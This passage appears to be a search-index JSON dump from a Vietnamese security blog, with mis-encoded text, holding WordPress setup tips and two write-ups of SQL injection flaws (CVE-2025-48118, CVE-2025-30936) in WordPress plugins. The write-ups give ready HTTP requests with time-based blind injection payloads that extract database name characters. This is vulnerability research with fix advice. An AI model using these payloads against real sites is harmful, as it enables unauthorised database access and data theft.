api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Woocommerce Partial Shipment c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 3.3. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-48118 Product: WordPress Woocommerce Partial Shipment Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 3.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Woocommerce Partial Shipment: v3.2(vul) v√† v3.3(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Actived WooCommerce plugin: plugin b·∫Øt bu·ªôc actived tr∆∞·ªõc khi c√†i Woocommerce Partial Shipment Plugin, m·ªôt s·ªë h√†m trong WooCommerce s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng. Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ POST request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file wc-partial-shipment/woocommerce-partial-shipment.php\nNh∆∞ng ·ªü ƒë√¢y, dev thay ƒë·ªïi kh√° nhi·ªÅu ta kh√≥ ƒë·ªÉ t√¨m ƒë∆∞·ª£c v·ªã tr√≠ l·ªói.\nTrong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global $wpdb, ta search t·ª´ kh√≥a n√†y trong file wc-partial-shipment/woocommerce-partial-shipment.php ƒë·ªÉ t√¨m sink. {: .prompt-tip }\nget_shipment_id v√† get_wxp_shipment_data l√† 2 h√†m thu·ªôc class WXP_Partial_Shipment ƒë√°ng ch√∫ √Ω, d·ªØ li·ªáu ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o c√¢u query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t n√†o. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\nB·∫£n v√° s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() ƒë·ªÉ chu·∫©n b·ªã c√¢u query, thay v√¨ n·ªëi tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng. ƒêi·ªÅu n√†y ƒë·∫£m b·∫£o r·∫±ng t·∫•t c·∫£ gi√° tr·ªã ƒë∆∞·ª£c escape ƒë√∫ng c√°ch tr∆∞·ªõc khi ch√®n v√†o SQL, ngƒÉn ng·ª´a nguy c∆° SQL Injection.\nHow it work? get_shipment_id v√† get_wxp_shipment_data ƒë·ªÅu ƒë∆∞·ª£c h√†m wxp_order_set_shipped trong c√πng class g·ªçi v√† s·ª≠ d·ª•ng.\nfunction wxp_order_set_shipped(){ $order_id = isset($_POST[\u0026#39;order_id\u0026#39;]) ? $_POST[\u0026#39;order_id\u0026#39;] : 0; // other logic $wxp_shipment = $this-\u0026gt;get_wxp_shipment_data($order_id); if(isset($_POST[\u0026#39;order_id\u0026#39;]) \u0026amp;\u0026amp; $_POST[\u0026#39;order_id\u0026#39;]){ global $wpdb; $shipment_id = $this-\u0026gt;get_shipment_id($_POST[\u0026#39;order_id\u0026#39;]); if(!$shipment_id){ $data = array( \u0026#39;order_id\u0026#39; =\u0026gt;$order_id, \u0026#39;shipment_id\u0026#39; =\u0026gt;1, \u0026#39;shipment_url\u0026#39;=\u0026gt;\u0026#39;\u0026#39;, \u0026#39;shipment_num\u0026#39;=\u0026gt;\u0026#39;\u0026#39;, \u0026#39;shipment_date\u0026#39;=\u0026gt;current_time(\u0026#39;timestamp\u0026#39;,0), ); $wpdb-\u0026gt;insert($wpdb-\u0026gt;prefix.\u0026#34;partial_shipment\u0026#34;,$data,array(\u0026#39;%d\u0026#39;,\u0026#39;%d\u0026#39;,\u0026#39;%s\u0026#39;,\u0026#39;%s\u0026#39;,\u0026#39;%s\u0026#39;)); $shipment_id = $wpdb-\u0026gt;insert_id; } // other logic } echo json_encode(array(\u0026#39;order_id\u0026#39;=\u0026gt;$order_id,\u0026#39;status\u0026#39;=\u0026gt;$status_key)); exit(); } üëâ order_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request, n∆°i ng∆∞·ªùi d√πng c√≥ th·ªÉ ki·ªÉm so√°t l√†m ƒë·ªëi s·ªë khi g·ªçi h√†m get_shipment_id v√† get_wxp_shipment_data truy·ªÅn v√†o c√¢u query ch·ª©a l·ªï h·ªóng SQLi.\nƒê·ªÉ x√°c ƒë·ªãnh n∆°i wxp_order_set_shipped ƒë∆∞·ª£c g·ªçi v√† s·ª≠ d·ª•ng, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a wxp_order_set_shipped trong th∆∞ m·ª•c ch·ª©a plugin.\nwxp_order_set_shipped ƒë∆∞·ª£c construct c·ªßa c√πng class s·ª≠ d·ª•ng l√†m callback cho hook wp_ajax_wxp_order_set_shipped =\u0026gt; y√™u c·∫ßu ng∆∞·ªùi d√πng ph·∫£i ƒëƒÉng nh·∫≠p\nüëâ Khi truy c·∫≠p v√†o /wp-admin/admin-ajax.php v·ªõi tham s·ªë:\naction=wxp_order_set_shipped\u0026amp;order_id=payload_here Callback wxp_order_set_shipped ƒë∆∞·ª£c g·ªçi order_id ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query. Query th·ª±c thi 2 l·∫ßn do ƒë∆∞·ª£c truy·ªÅn v√†o 2 h√†m ch·∫°y l·ªánh SQL v·ªõi payload ƒë·ªôc h·∫°i. Exploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi.\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026amp;order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT id as ship_id FROM wp_partial_shipment WHERE order_id=(SELECT 1 FROM (SELECT SLEEP(5))a) ·ªû ƒë√¢y c√≥ 2 n∆°i th·ª±c hi·ªán query n√™n th·ªùi gian ph·∫£n h·ªìi s·∫Ω tƒÉng g·∫•p ƒë√¥i\nTa s·ª≠ d·ª•ng subquery trong m·ªánh ƒë·ªÅ FROM v√¨ truy v·∫•n con ƒë∆∞·ª£c coi nh∆∞ m·ªôt b·∫£ng t·∫°m th·ªùi. MySQL s·∫Ω th·ª±c thi truy v·∫•n con tr∆∞·ªõc ƒë·ªÉ t·∫°o b·∫£ng t·∫°m, sau ƒë√≥ m·ªõi th·ª±c hi·ªán truy v·∫•n ch√≠nh. Khi so s√°nh theo t·ª´ng row, SLEEP ch·ªâ ch·∫°y m·ªôt l·∫ßn trong qu√° tr√¨nh kh·ªüi t·∫°o b·∫£ng t·∫°m, c√°c l·∫ßn so s√°nh ti·∫øp theo s·∫Ω kh√¥ng th·ª±c thi l·∫°i, nh·ªù ƒë√≥ tr√°nh vi·ªác SLEEP b·ªã nh√¢n nhi·ªÅu l·∫ßn.\nV√≠ d·ª• khi g·ª≠i request v·ªõi payload n√†y:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026amp;order_id=(SELECT SLEEP(5)) Th·ªùi gian tr·∫£ v·ªÅ tƒÉng theo c·∫•p s·ªë nh√¢n\nGet First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=wxp_order_set_shipped\u0026amp;order_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ order_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nD·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript here\nConclusion L·ªó h·ªïng CVE-2025-48118 trong plugin WordPress Woocommerce Partial Shipment tr∆∞·ªõc phi√™n b·∫£n 3.3, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nCh∆∞a c√≥ b·∫£n v√° ch√≠nh th·ª±c n√†o cho l·ªó h·ªïng n√†y.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Woocommerce Partial Shipment Plugin \u0026lt;= 3.2 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-10-cve-2025-48118/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eWoocommerce Partial Shipment\u003c/strong\u003e c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e3.3\u003c/strong\u003e. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-48118\"\u003eCVE-2025-48118\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/wc-partial-shipment/advanced/\"\u003eWordPress Woocommerce Partial Shipment Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 3.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eWoocommerce Partial Shipment\u003c/strong\u003e:  v3.2(vul) v√† v3.3(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th·∫•y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eActived WooCommerce plugin\u003c/strong\u003e: plugin b·∫Øt bu·ªôc \u003cstrong\u003eactived\u003c/strong\u003e tr∆∞·ªõc khi c√†i \u003cstrong\u003eWoocommerce Partial Shipment Plugin\u003c/strong\u003e, m·ªôt s·ªë h√†m trong \u003cstrong\u003eWooCommerce\u003c/strong\u003e s·∫Ω ƒë∆∞·ª£c s·ª≠ d·ª•ng.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003ePOST\u003c/strong\u003e request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-48118"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Torod c·ªßa WordPress. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-30936 Product: WordPress Torod Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.9 Fixed in: \u0026lt;= N/A CVSS severity: High (9.3) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Torod: v1.9 Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ POST request v√†o SQL query m√† kh√¥ng c√≥ c∆° ch·∫ø qu·∫£n ki·ªÉm so√°t ch·∫∑t ch·∫Ω.\nVulnerable Sink CVE n√†y kh√¥ng c√≥ b·∫£n v√° n√™n kh√¥ng th·ªÉ s·ª≠ d·ª•ng diff tool ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa code l·ªói v√† code ƒë√£ fix l·ªói.\nTrong WordPress, ƒë·ªÉ SQLi x·∫£y ra, ·ª©ng d·ª•ng ph·∫£i t∆∞∆°ng t√°c v·ªõi database th√¥ng qua bi·∫øn global $wpdb, ta search t·ª´ kh√≥a n√†y trong th∆∞ m·ª•c c·ªßa plugin ƒë·ªÉ t√¨m sink. {: .prompt-tip }\nüëâ D·ªØ li·ªáu t·ª´ $_POST['country_id'] ƒë∆∞·ª£c ƒë∆∞a th·∫≥ng v√†o truy v·∫•n SQL m√† kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t h·ª£p l·ªá. Vi·ªác ch·ªâ s·ª≠ d·ª•ng sanitize_text_field() m·ªõi d·ª´ng l·∫°i ·ªü m·ª©c escape chu·ªói, ch·ª© kh√¥ng ƒë·∫£m b·∫£o t√≠nh an to√†n. Do ƒë√≥, l·ªó h·ªïng SQLi c√≥ th·ªÉ x·∫£y ra.\nSource: $_POST['country_id'] Sink: $wpdb-\u0026gt;get_results(\u0026quot;SELECT * FROM $table_name WHERE country_id = $country_id\u0026quot;) How it work? L·ªó h·ªïng n·∫±m trong h√†m get_regions_and_cities c·ªßa class ajaxyk thu·ªôc file inc/ajaxyk.php. ƒê·ªÉ x√°c ƒë·ªãnh n∆°i n√≥ ƒë∆∞·ª£c g·ªçi, ta t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a get_regions_and_cities trong th∆∞ m·ª•c ch·ª©a plugin.\nüëâ get_regions_and_cities ƒë∆∞·ª£c construct c·ªßa class ajaxyk g·ªçi l√†m callback c·ªßa 2 action hook th√¥ng qua h√†m add_action\nwp_ajax_get_regions_and_cities\nƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p wp_ajax_{$action} Y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p wp_ajax_nopriv_get_regions_and_cities\nƒê∆∞·ª£c vi·∫øt theo c√∫ ph√°p wp_ajax_nopriv_{$action} Kh√¥ng y√™u c·∫ßu ng∆∞·ªùi d√πng ƒëƒÉng nh·∫≠p V√¨ ƒë√¢y l√† l·ªó h·ªïng unauthenticated n√™n ta ch·ªâ quan t√¢m t·ªõi hook wp_ajax_nopriv_get_regions_and_cities.\nNh∆∞ v·∫≠y khi g·ª≠i POST request ƒë·∫øn /wp-admin/admin-ajax.php v·ªõi tham s·ªë\naction=wp_ajax_nopriv_get_regions_and_cities\u0026amp;country_id=payload_here: Callback get_regions_and_cities ƒë∆∞·ª£c g·ªçi. country_id ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ request v√† ch√®n v√†o SQL query. Query th·ª±c thi v·ªõi payload ƒë·ªôc h·∫°i. Exploit Detect SQLi G·ª≠i POST request ch·ª©a payload SQLi.\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities\u0026amp;country_id=(SELECT 1 FROM (SELECT SLEEP(5))a) Khi ƒë√≥ c√¢u query s·∫Ω tr·ªü th√†nh:\nSELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a) üëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; payload ho·∫°t ƒë·ªông.\nC√°c technique c√≥ th·ªÉ s·ª≠ d·ª•ng trong tr∆∞·ªùng h·ª£p table r·ªóng:\nUNION: v√¨ n√≥ kh√¥ng ph·ª• thu·ªôc v√†o d·ªØ li·ªáu b·∫£ng c·ªßa c√¢u query tr∆∞·ªõc ƒë√≥, nh∆∞ng c·∫ßn ph·∫£i t√¨m ƒë∆∞·ª£c s·ªë c·ªôt t∆∞∆°ng ·ª©ng. Subquery: Subquery trong m·ªánh ƒë·ªÅ WHERE: MySQL c√≥ th·ªÉ t·ªëi ∆∞u h√≥a v√† b·ªè qua subquery n·∫øu k·∫øt qu·∫£ c√≥ th·ªÉ x√°c ƒë·ªãnh s·ªõm. N·∫øu b·∫£ng kh√¥ng c√≥ d·ªØ li·ªáu, k·∫øt qu·∫£ cu·ªëi c√πng s·∫Ω l√† t·∫≠p r·ªóng, MySQL kh√¥ng c·∫ßn th·ª±c thi SLEEP(). Subquery trong m·ªánh ƒë·ªÅ FROM: Truy v·∫•n con ƒë∆∞·ª£c coi l√† b·∫£ng t·∫°m th·ªùi. MySQL ph·∫£i th·ª±c thi truy v·∫•n con n√†y ƒë·∫ßu ti√™n ƒë·ªÉ t·∫°o b·∫£ng t·∫°m th·ªùi, sau ƒë√≥ m·ªõi th·ª±c thi truy v·∫•n ch√≠nh. Get First Letter of Database Name ƒêi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ dump ƒë∆∞·ª£c h·∫øt data l√† ph·∫£i dump ƒë∆∞·ª£c 1 k√Ω t·ª± b·∫•t k·ª≥ c·ªßa t√™n database, n·∫øu l·∫•y ƒë∆∞·ª£c th√¨ g·∫ßn nh∆∞ to√†n b·ªô data ƒë·ªÅu dump ƒë∆∞·ª£c.\nG·ª≠i request v·ªõi SQLi payload:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities=1\u0026amp;country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) S·ª≠ d·ª•ng SUBSTRING() ƒë·ªÉ l·∫•y k√Ω t·ª± ƒë·∫ßu ti√™n c·ªßa database name, IF() tr·∫£ v·ªÅ SLEEP(5) n·∫øu k√Ω t·ª± ƒë√≥ l√† 0x77(\u0026lsquo;w\u0026rsquo;)\nS·ª≠ d·ª•ng hex encoding w th√†nh 0x77 v√¨ country_id ƒë∆∞·ª£c l·∫•y t·ª´ POST request trong n√™n b·ªã escape b·ªüi magic quotes trong WordPress v√† b·ªüi sanitize_text_field.\nüëâ D·ª±a tr√™n th·ªùi gian ph·∫£n h·ªìi =\u0026gt; k√≠ t·ª± ƒë·∫ßu ti√™n ƒë√∫ng l√† w.\nD·ª±a tr√™n kƒ© thu·∫≠t Timebased SQLi ta vi·∫øt script ƒë·ªÉ t·ª± ƒë·ªông khai th√°c.\nScript here\nConclusion L·ªó h·ªïng CVE-2025-30936 trong plugin WordPress Torod t·ª´ phi√™n b·∫£n 1.9 tr·ªü l·∫°i, xu·∫•t ph√°t t·ª´ vi·ªác truy·ªÅn tr·ª±c ti·∫øp input t·ª´ ng∆∞·ªùi d√πng v√†o SQL query m√† kh√¥ng c√≥ bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nCh∆∞a c√≥ b·∫£n v√° ch√≠nh th·ª±c n√†o cho l·ªó h·ªïng n√†y.\nKey takeaways:\nKi·ªÉm so√°t k·ªπ input t·ª´ ng∆∞·ªùi d√πng. Lu√¥n s·ª≠ d·ª•ng $wpdb-\u0026gt;prepare() khi l√†m vi·ªác v·ªõi database trong WordPress ƒë·ªÉ tr√°nh SQL Injection. Th∆∞·ªùng xuy√™n c·∫≠p nh·∫≠t plugin v√† ki·ªÉm tra b·∫£o m·∫≠t ƒë·ªÉ tr√°nh tr·ªü th√†nh m·ª•c ti√™u t·∫•n c√¥ng. References SQL Injection cheat sheet - PortSwigger\nWordPress Torod Plugin \u0026lt;= 1.9 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-10-cve-2025-30936/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eL·ªó h·ªïng x·∫£y ra tr√™n plugin \u003cstrong\u003eTorod\u003c/strong\u003e c·ªßa WordPress. ƒêi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu c·ªßa b·∫°n, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-30936\"\u003eCVE-2025-30936\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/torod/\"\u003eWordPress Torod Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.9\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFixed in\u003c/strong\u003e: \u0026lt;= N/A\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e:  High (9.3)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Unauthenticated\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and 